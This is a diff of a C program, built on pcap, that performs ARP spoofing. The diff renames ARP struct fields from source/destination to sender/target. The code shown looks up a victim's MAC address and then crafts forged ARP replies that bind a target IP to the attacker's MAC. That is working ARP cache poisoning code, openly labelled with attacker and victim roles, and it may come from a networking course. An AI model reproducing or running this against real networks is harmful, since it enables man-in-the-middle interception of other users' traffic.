@@ -19,7 +19,7 @@ void receiveArpPacket(IN pcap_t *handle, IN uint8_t *ipAddress, OUT arpStructure
         switch(ntohs(ethernetPacket->type)) {
             case ETHERNET_TYPE_ARP: // value is 0x0806
                 arpPacket = (arpStructure *)(packet + sizeof(ethernetHeader));
-                if(!memcmp(arpPacket->sourceProtocolAddress, ipAddress, ARP_PROTOCOL_LENGTH_IP)) { 
+                if(!memcmp(arpPacket->senderProtocolAddress, ipAddress, ARP_PROTOCOL_LENGTH_IP)) { 
 
                     // Print Ethernet Packet
                     printf("[*] Ethernet Information\n");
@@ -73,16 +73,16 @@ int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *vict
     arpPacket.operationCode  = htons(ARP_OPERATION_REQUEST);
 
     // set source MAC Address for ARP
-    if(getMacAddress(interfaceName, arpPacket.sourceHardwareAddress) == EXIT_FAILURE) {
+    if(getMacAddress(interfaceName, arpPacket.senderHardwareAddress) == EXIT_FAILURE) {
         fprintf(stderr, "Invalid Attacker MAC Address!\n");
         goto end;
     }
 
     // set destination MAC Address
-    memset(arpPacket.destinationHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);
+    memset(arpPacket.targetHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);
 
     // set source IP Address 
-    if(getIpAddress(interfaceName, arpPacket.sourceProtocolAddress) < 0) {
+    if(getIpAddress(interfaceName, arpPacket.senderProtocolAddress) < 0) {
         fprintf(stderr, "Get IP Address Failed!\n");
         goto end;
     }
@@ -92,7 +92,7 @@ int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *vict
         fprintf(stderr, "IP Address Format Invalid!\n");
         goto end;
     }
-    memcpy(&arpPacket.destinationProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
+    memcpy(&arpPacket.targetProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
 
     // assemble Packet
     memcpy(buf, &ethernetPacket, sizeof(ethernetHeader));
@@ -110,12 +110,12 @@ int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *vict
     printf("\n");
 
     printf("[+] Get MAC Address\n");
-    receiveArpPacket(handle, arpPacket.destinationProtocolAddress, &receivedArpPacket);
-    if(!receivedArpPacket.sourceHardwareAddress) {
+    receiveArpPacket(handle, arpPacket.targetProtocolAddress, &receivedArpPacket);
+    if(!receivedArpPacket.senderHardwareAddress) {
         fprintf(stderr, "Receive ARP Packet Error!\n");
         goto end;
     }
-    memcpy(victimMacAddress, receivedArpPacket.sourceHardwareAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    memcpy(victimMacAddress, receivedArpPacket.senderHardwareAddress, ARP_HARDWARE_LENGTH_ETHERNET);
     
     ret = EXIT_SUCCESS;
 
@@ -153,27 +153,27 @@ int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIp
     arpPacket.operationCode  = htons(ARP_OPERATION_REPLY);
 
     // set source MAC Address for ARP
-    if(getMacAddress(interfaceName, arpPacket.sourceHardwareAddress) == EXIT_FAILURE) {
+    if(getMacAddress(interfaceName, arpPacket.senderHardwareAddress) == EXIT_FAILURE) {
         fprintf(stderr, "Invalid Attacker MAC Address!\n");
         goto end;
     }
 
     // set destination MAC Address
-    memcpy(arpPacket.destinationHardwareAddress, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    memcpy(arpPacket.targetHardwareAddress, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
 
     // set source IP Address 
     if(inet_aton(targetIpAddress, &laddr) < 0) {
         fprintf(stderr, "IP Address Format Invalid!\n");
         goto end;
     }
-    memcpy(&arpPacket.sourceProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
+    memcpy(&arpPacket.senderProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
 
     // set destination IP Address 
     if(inet_aton(victimIpAddress, &laddr) < 0) {
         fprintf(stderr, "IP Address Format Invalid!\n");
         goto end;
     }
-    memcpy(&arpPacket.destinationProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
+    memcpy(&arpPacket.targetProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
 
     // Assemble Packet
     memcpy(buf, &ethernetPacket, sizeof(ethernetHeader));
